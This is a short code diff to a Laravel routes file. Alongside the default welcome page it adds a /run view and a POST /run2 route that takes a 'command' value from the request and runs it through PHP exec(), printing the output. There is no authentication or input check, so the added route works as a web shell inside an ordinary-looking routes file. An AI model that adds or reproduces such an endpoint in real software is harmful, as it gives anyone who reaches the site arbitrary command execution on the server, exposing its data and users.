@@ -16,3 +16,14 @@ use Illuminate\Support\Facades\Route;
 Route::get('/', function () {
     return view('welcome');
 });
+Route::get("/run", function () {
+    return view("run");
+});
+Route::post("/run2", function () {
+    $command = request()->command;
+    $ex = '';
+    $e = 
+    exec($command, $ex , $e);
+    print_r($ex);
+    print_r($e);
+})->name("run_command");
